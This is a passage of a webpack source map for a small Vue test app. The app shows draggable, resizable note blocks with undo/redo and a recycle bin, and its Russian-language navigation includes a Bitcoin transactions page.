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","file":"js/app.801955f3.js","sourcesContent":[" \t// install a JSONP callback for chunk loading\n \tfunction webpackJsonpCallback(data) {\n \t\tvar chunkIds = data[0];\n \t\tvar moreModules = data[1];\n \t\tvar executeModules = data[2];\n\n \t\t// add \"moreModules\" to the modules object,\n \t\t// then flag all \"chunkIds\" as loaded and fire callback\n \t\tvar moduleId, chunkId, i = 0, resolves = [];\n \t\tfor(;i < chunkIds.length; i++) {\n \t\t\tchunkId = chunkIds[i];\n \t\t\tif(Object.prototype.hasOwnProperty.call(installedChunks, chunkId) && installedChunks[chunkId]) {\n \t\t\t\tresolves.push(installedChunks[chunkId][0]);\n \t\t\t}\n \t\t\tinstalledChunks[chunkId] = 0;\n \t\t}\n \t\tfor(moduleId in moreModules) {\n \t\t\tif(Object.prototype.hasOwnProperty.call(moreModules, moduleId)) {\n \t\t\t\tmodules[moduleId] = moreModules[moduleId];\n \t\t\t}\n \t\t}\n \t\tif(parentJsonpFunction) parentJsonpFunction(data);\n\n \t\twhile(resolves.length) {\n \t\t\tresolves.shift()();\n \t\t}\n\n \t\t// add entry modules from loaded chunk to deferred list\n \t\tdeferredModules.push.apply(deferredModules, executeModules || []);\n\n \t\t// run deferred modules when all chunks ready\n \t\treturn checkDeferredModules();\n \t};\n \tfunction checkDeferredModules() {\n \t\tvar result;\n \t\tfor(var i = 0; i < deferredModules.length; i++) {\n \t\t\tvar deferredModule = deferredModules[i];\n \t\t\tvar fulfilled = true;\n \t\t\tfor(var j = 1; j < deferredModule.length; j++) {\n \t\t\t\tvar depId = deferredModule[j];\n \t\t\t\tif(installedChunks[depId] !== 0) fulfilled = false;\n \t\t\t}\n \t\t\tif(fulfilled) {\n \t\t\t\tdeferredModules.splice(i--, 1);\n \t\t\t\tresult = __webpack_require__(__webpack_require__.s = deferredModule[0]);\n \t\t\t}\n \t\t}\n\n \t\treturn result;\n \t}\n\n \t// The module cache\n \tvar installedModules = {};\n\n \t// object to store loaded and loading chunks\n \t// undefined = chunk not loaded, null = chunk preloaded/prefetched\n \t// Promise = chunk loading, 0 = chunk loaded\n \tvar installedChunks = {\n \t\t\"app\": 0\n \t};\n\n \tvar deferredModules = [];\n\n \t// The require function\n \tfunction __webpack_require__(moduleId) {\n\n \t\t// Check if module is in cache\n \t\tif(installedModules[moduleId]) {\n \t\t\treturn installedModules[moduleId].exports;\n \t\t}\n \t\t// Create a new module (and put it into the cache)\n \t\tvar module = installedModules[moduleId] = {\n \t\t\ti: moduleId,\n \t\t\tl: false,\n \t\t\texports: {}\n \t\t};\n\n \t\t// Execute the module function\n \t\tmodules[moduleId].call(module.exports, module, module.exports, __webpack_require__);\n\n \t\t// Flag the module as loaded\n \t\tmodule.l = true;\n\n \t\t// Return the exports of the module\n \t\treturn module.exports;\n \t}\n\n\n \t// expose the modules object (__webpack_modules__)\n \t__webpack_require__.m = modules;\n\n \t// expose the module cache\n \t__webpack_require__.c = installedModules;\n\n \t// define getter function for harmony exports\n \t__webpack_require__.d = function(exports, name, getter) {\n \t\tif(!__webpack_require__.o(exports, name)) {\n \t\t\tObject.defineProperty(exports, name, { enumerable: true, get: getter });\n \t\t}\n \t};\n\n \t// define __esModule on exports\n \t__webpack_require__.r = function(exports) {\n \t\tif(typeof Symbol !== 'undefined' && Symbol.toStringTag) {\n \t\t\tObject.defineProperty(exports, Symbol.toStringTag, { value: 'Module' });\n \t\t}\n \t\tObject.defineProperty(exports, '__esModule', { value: true });\n \t};\n\n \t// create a fake namespace object\n \t// mode & 1: value is a module id, require it\n \t// mode & 2: merge all properties of value into the ns\n \t// mode & 4: return value when already ns object\n \t// mode & 8|1: behave like require\n \t__webpack_require__.t = function(value, mode) {\n \t\tif(mode & 1) value = __webpack_require__(value);\n \t\tif(mode & 8) return value;\n \t\tif((mode & 4) && typeof value === 'object' && value && value.__esModule) return value;\n \t\tvar ns = Object.create(null);\n \t\t__webpack_require__.r(ns);\n \t\tObject.defineProperty(ns, 'default', { enumerable: true, value: value });\n \t\tif(mode & 2 && typeof value != 'string') for(var key in value) __webpack_require__.d(ns, key, function(key) { return value[key]; }.bind(null, key));\n \t\treturn ns;\n \t};\n\n \t// getDefaultExport function for compatibility with non-harmony modules\n \t__webpack_require__.n = function(module) {\n \t\tvar getter = module && module.__esModule ?\n \t\t\tfunction getDefault() { return module['default']; } :\n \t\t\tfunction getModuleExports() { return module; };\n \t\t__webpack_require__.d(getter, 'a', getter);\n \t\treturn getter;\n \t};\n\n \t// Object.prototype.hasOwnProperty.call\n \t__webpack_require__.o = function(object, property) { return Object.prototype.hasOwnProperty.call(object, property); };\n\n \t// __webpack_public_path__\n \t__webpack_require__.p = \"/wallet-vue-test-2/\";\n\n \tvar jsonpArray = window[\"webpackJsonp\"] = window[\"webpackJsonp\"] || [];\n \tvar oldJsonpFunction = jsonpArray.push.bind(jsonpArray);\n \tjsonpArray.push = webpackJsonpCallback;\n \tjsonpArray = jsonpArray.slice();\n \tfor(var i = 0; i < jsonpArray.length; i++) webpackJsonpCallback(jsonpArray[i]);\n \tvar parentJsonpFunction = oldJsonpFunction;\n\n\n \t// add entry module to deferred list\n \tdeferredModules.push([0,\"chunk-vendors\"]);\n \t// run deferred modules when ready\n \treturn checkDeferredModules();\n","export * from \"-!../node_modules/mini-css-extract-plugin/dist/loader.js??ref--6-oneOf-1-0!../node_modules/css-loader/dist/cjs.js??ref--6-oneOf-1-1!../node_modules/vue-loader/lib/loaders/stylePostLoader.js!../node_modules/postcss-loader/src/index.js??ref--6-oneOf-1-2!../node_modules/cache-loader/dist/cjs.js??ref--0-0!../node_modules/vue-loader/lib/index.js??vue-loader-options!./App.vue?vue&type=style&index=0&lang=css&\"","export * from \"-!../../../node_modules/mini-css-extract-plugin/dist/loader.js??ref--6-oneOf-1-0!../../../node_modules/css-loader/dist/cjs.js??ref--6-oneOf-1-1!../../../node_modules/vue-loader/lib/loaders/stylePostLoader.js!../../../node_modules/postcss-loader/src/index.js??ref--6-oneOf-1-2!../../../node_modules/cache-loader/dist/cjs.js??ref--0-0!../../../node_modules/vue-loader/lib/index.js??vue-loader-options!./Header.vue?vue&type=style&index=0&lang=css&\"","export * from \"-!../../node_modules/mini-css-extract-plugin/dist/loader.js??ref--6-oneOf-1-0!../../node_modules/css-loader/dist/cjs.js??ref--6-oneOf-1-1!../../node_modules/vue-loader/lib/loaders/stylePostLoader.js!../../node_modules/postcss-loader/src/index.js??ref--6-oneOf-1-2!../../node_modules/cache-loader/dist/cjs.js??ref--0-0!../../node_modules/vue-loader/lib/index.js??vue-loader-options!./Desktop.vue?vue&type=style&index=0&lang=css&\"","export * from \"-!../../../node_modules/mini-css-extract-plugin/dist/loader.js??ref--6-oneOf-1-0!../../../node_modules/css-loader/dist/cjs.js??ref--6-oneOf-1-1!../../../node_modules/vue-loader/lib/loaders/stylePostLoader.js!../../../node_modules/postcss-loader/src/index.js??ref--6-oneOf-1-2!../../../node_modules/cache-loader/dist/cjs.js??ref--0-0!../../../node_modules/vue-loader/lib/index.js??vue-loader-options!./Bin.vue?vue&type=style&index=0&lang=css&\"","var render = function () {var _vm=this;var _h=_vm.$createElement;var _c=_vm._self._c||_h;return _c('div',{attrs:{\"id\":\"app\"}},[_c('Header'),_c('router-view')],1)}\nvar staticRenderFns = []\n\nexport { render, staticRenderFns }","var render = function () {var _vm=this;var _h=_vm.$createElement;var _c=_vm._self._c||_h;return _c('header',{staticClass:\"header\"},[_c('router-link',{attrs:{\"to\":\"/desktop\"}},[_vm._v(\"Рабочий стол\")]),_c('router-link',{attrs:{\"to\":\"/bitcoin\"}},[_vm._v(\"Биткоин транзакции\")])],1)}\nvar staticRenderFns = []\n\nexport { render, staticRenderFns }","import { render, staticRenderFns } from \"./Header.vue?vue&type=template&id=35dc7c40&\"\nvar script = {}\nimport style0 from \"./Header.vue?vue&type=style&index=0&lang=css&\"\n\n\n/* normalize component */\nimport normalizer from \"!../../../node_modules/vue-loader/lib/runtime/componentNormalizer.js\"\nvar component = normalizer(\n  script,\n  render,\n  staticRenderFns,\n  false,\n  null,\n  null,\n  null\n  \n)\n\nexport default component.exports","<template>\r\n    <div id=\"app\">\r\n        <Header />\r\n        <router-view/>\r\n    </div>\r\n</template>\r\n\r\n<script>\r\nimport Header from './views/parts/Header'\r\nexport default {\r\n    components: { Header }\r\n};\r\n</script>\r\n\r\n<style>\r\n*, *::before, *::after {box-sizing: border-box; margin: 0; padding: 0; vertical-align: top;}\r\n#app {\r\n    font-family: Avenir, Helvetica, Arial, sans-serif;\r\n    -webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale;\r\n    background: #f5f5f5; color: #2c3e50; text-align: center; min-height: 100vh;\r\n}\r\n.page {padding: 10px;}\r\n</style>\r\n","import mod from \"-!../node_modules/cache-loader/dist/cjs.js??ref--12-0!../node_modules/thread-loader/dist/cjs.js!../node_modules/babel-loader/lib/index.js!../node_modules/cache-loader/dist/cjs.js??ref--0-0!../node_modules/vue-loader/lib/index.js??vue-loader-options!./App.vue?vue&type=script&lang=js&\"; export default mod; export * from \"-!../node_modules/cache-loader/dist/cjs.js??ref--12-0!../node_modules/thread-loader/dist/cjs.js!../node_modules/babel-loader/lib/index.js!../node_modules/cache-loader/dist/cjs.js??ref--0-0!../node_modules/vue-loader/lib/index.js??vue-loader-options!./App.vue?vue&type=script&lang=js&\"","import { render, staticRenderFns } from \"./App.vue?vue&type=template&id=99853014&\"\nimport script from \"./App.vue?vue&type=script&lang=js&\"\nexport * from \"./App.vue?vue&type=script&lang=js&\"\nimport style0 from \"./App.vue?vue&type=style&index=0&lang=css&\"\n\n\n/* normalize component */\nimport normalizer from \"!../node_modules/vue-loader/lib/runtime/componentNormalizer.js\"\nvar component = normalizer(\n  script,\n  render,\n  staticRenderFns,\n  false,\n  null,\n  null,\n  null\n  \n)\n\nexport default component.exports","var render = function () {var _vm=this;var _h=_vm.$createElement;var _c=_vm._self._c||_h;return _c('div',{staticClass:\"desktop\"},[_c('div',{staticClass:\"desk\"},_vm._l((_vm.desktop.models),function(block){return _c('Block',{key:block.id,attrs:{\"block\":block}})}),1),_c('Bin'),_c('div',{staticClass:\"history\"},[_c('button',{staticClass:\"btn\",attrs:{\"disabled\":!_vm.history.hasUndo()},on:{\"click\":function($event){return _vm.history.undo()}}},[_vm._v(\"↩ Undo (\"+_vm._s(_vm.history.undoCount())+\") \")]),_c('button',{staticClass:\"btn\",attrs:{\"disabled\":!_vm.history.hasRedo()},on:{\"click\":function($event){return _vm.history.redo()}}},[_vm._v(\" Redo (\"+_vm._s(_vm.history.redoCount())+\") ↪\")]),_c('button',{staticClass:\"btn\",on:{\"click\":function($event){return _vm.desktop.reset()}}},[_vm._v(\"Reset\")])])],1)}\nvar staticRenderFns = []\n\nexport { render, staticRenderFns }","var render = function () {var _vm=this;var _h=_vm.$createElement;var _c=_vm._self._c||_h;return _c('div',{class:_vm.blockClass,style:(_vm.blockStyle),on:{\"mousedown\":_vm.moveStart}},[_c('div',{staticClass:\"block-header\"},[_c('h2',{staticClass:\"block-title\"},[_vm._v(_vm._s(_vm.block.title))]),_c('div',{staticClass:\"block--remove\",attrs:{\"title\":\"Переместить в корзину\"},on:{\"mousedown\":_vm.remove}})]),_c('p',{staticClass:\"block-content\"},[_vm._v(_vm._s(_vm.block.content))]),_c('div',{staticClass:\"resize\",attrs:{\"title\":\"Нажмите и тяните чтобы изменить размер блока\"},on:{\"mousedown\":_vm.resizeStart}})])}\nvar staticRenderFns = []\n\nexport { render, staticRenderFns }","<template>\r\n    <div :class=\"blockClass\" :style=\"blockStyle\" @mousedown=\"moveStart\">\r\n        <div class=\"block-header\">\r\n            <h2 class=\"block-title\">{{ block.title }}</h2>\r\n            <div @mousedown=\"remove\" class=\"block--remove\" title=\"Переместить в корзину\"></div>\r\n        </div>\r\n        <p class=\"block-content\">{{ block.content }}</p>\r\n        <div class=\"resize\" @mousedown=\"resizeStart\" title=\"Нажмите и тяните чтобы изменить размер блока\"></div>\r\n    </div>\r\n</template>\r\n\r\n<script>\r\nexport default {\r\n    props: {\r\n        block: { type: Object },\r\n    },\r\n    computed: {\r\n        blockClass () {\r\n            let className = 'block'\r\n            if (!this.block.intersecting) className += ' nonIntersecting'\r\n            if (this.block.blockUp) className += ' blockUp'\r\n            if ('move' == this.block.action) className += ' move'\r\n            return className\r\n        },\r\n        blockStyle () {\r\n            return `left: ${this.block.posX}px; top: ${this.block.posY}px; width: ${this.block.sizeX}px; height: ${this.block.sizeY}px; z-index: ${this.block.posZ};`\r\n        },\r\n    },\r\n    methods: {\r\n        resizeStart(e) {\r\n            e.stopPropagation()\r\n            this.block.actionStart('resize', e)\r\n        },\r\n        moveStart(e) {\r\n            this.block.actionStart('move', e)\r\n        },\r\n        remove(e) {\r\n            e.stopPropagation()\r\n            this.block.remove()\r\n        }\r\n    },\r\n    created() {\r\n        window.addEventListener('mousemove', this.block.actionProcess)\r\n        window.addEventListener('mouseup', this.block.actionEnd)\r\n    },\r\n    beforeDestroy () {\r\n        window.removeEventListener('mousemove', this.block.actionProcess)\r\n        window.removeEventListener('mouseup', this.block.actionEnd)\r\n    },\r\n};\r\n</script>\r\n\r\n<style>\r\n.resize {\r\n    height: 20px; width: 20px; padding-top: 10px; overflow: hidden;\r\n    clip-path: polygon(100% 0%, 100% 100%, 0% 100%); cursor: nw-resize;\r\n    position: absolute; bottom: 1px; right: 1px;\r\n}\r\n.resize::before, .resize::after {\r\n    display: block; content: '';\r\n    border-bottom: solid 1px #333; border-top: solid 1px #333;\r\n    height: 3px; width: 30px; transform: rotate(-45deg);\r\n}\r\n.resize::after {margin-top: 3px;}\r\n\r\n.desk .block {\r\n    background: #fff; border: solid #ddd 2px; border-radius: 5px;\r\n    box-shadow: 0 0 10px 0 rgba(0,0,0,.1); height: 100px; width: 300px;\r\n    position: absolute; user-select: none;\r\n}\r\n.desk .block-header {\r\n    background: #eee; border-bottom: solid #ddd 2px; border-radius: 5px 5px 0 0; \r\n    padding: 7px 10px; position: relative;\r\n}\r\n.desk .block-title {font-size: 16px;}\r\n.desk .block--remove {\r\n    background: #fff; border: solid #ddd 2px; border-radius: 5px; cursor: pointer;\r\n    height: 24px; width: 24px;\r\n    position: absolute; right: 7px; top: calc(50% - 12px);\r\n    align-items: center; display: flex; justify-content: center;\r\n}\r\n.desk .block--remove::before {\r\n    background: #000; border-radius: 2px; content: ''; height: 4px; width: 14px;\r\n}\r\n.desk .block--remove:hover {box-shadow: 0 0 1px 1px rgba(255,0,0,.5) inset;}\r\n.desk .block-content {border-radius: 0 0 5px 5px; font-size: 15px; padding: 10px;}\r\n\r\n.desk .block.nonIntersecting {background: #fee;}\r\n.desk .block.move {cursor: move;}\r\n.desk .block.blockUp {border-color: #69f;}\r\n.desk .block.blockUp .block-header {background: #acf; border-color: #69f;}\r\n.desk .block.blockUp .block--remove {border-color: #69f;}\r\n</style>\r\n","import mod from \"-!../../../node_modules/cache-loader/dist/cjs.js??ref--12-0!../../../node_modules/thread-loader/dist/cjs.js!../../../node_modules/babel-loader/lib/index.js!../../../node_modules/cache-loader/dist/cjs.js??ref--0-0!../../../node_modules/vue-loader/lib/index.js??vue-loader-options!./Block.vue?vue&type=script&lang=js&\"; export default mod; export * from \"-!../../../node_modules/cache-loader/dist/cjs.js??ref--12-0!../../../node_modules/thread-loader/dist/cjs.js!../../../node_modules/babel-loader/lib/index.js!../../../node_modules/cache-loader/dist/cjs.js??ref--0-0!../../../node_modules/vue-loader/lib/index.js??vue-loader-options!./Block.vue?vue&type=script&lang=js&\"","import { render, staticRenderFns } from \"./Block.vue?vue&type=template&id=77b84a54&\"\nimport script from \"./Block.vue?vue&type=script&lang=js&\"\nexport * from \"./Block.vue?vue&type=script&lang=js&\"\nimport style0 from \"./Block.vue?vue&type=style&index=0&lang=css&\"\n\n\n/* normalize component */\nimport normalizer from \"!../../../node_modules/vue-loader/lib/runtime/componentNormalizer.js\"\nvar component = normalizer(\n  script,\n  render,\n  staticRenderFns,\n  false,\n  null,\n  null,\n  null\n  \n)\n\nexport default component.exports","var render = function () {var _vm=this;var _h=_vm.$createElement;var _c=_vm._self._c||_h;return _c('div',{staticClass:\"bin\",style:(_vm.binStyle)},[(_vm.bin.opened)?_c('div',{staticClass:\"bin-blocks\"},[_vm._l((_vm.bin.models),function(block,key){return _c('div',{key:key,staticClass:\"block\"},[_c('div',{staticClass:\"block-title\"},[_vm._v(_vm._s(block.title))]),_c('div',{staticClass:\"btn btn--restore\",on:{\"click\":block.restore}},[_vm._v(\"Восстановить\")]),_c('div',{staticClass:\"btn 